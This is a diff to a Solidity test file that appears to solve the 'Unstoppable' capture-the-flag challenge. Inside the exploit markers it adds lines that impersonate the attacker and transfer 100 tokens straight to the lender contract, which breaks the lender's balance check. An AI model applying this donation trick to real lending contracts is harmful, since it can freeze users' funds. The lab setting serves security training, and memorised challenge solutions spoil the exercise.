@@ -60,6 +60,9 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        dvt.approve(address(attacker), 100000000000000000000);
+        dvt.transfer(address(unstoppableLender), 100000000000000000000);
         /**
          * EXPLOIT END *
          */
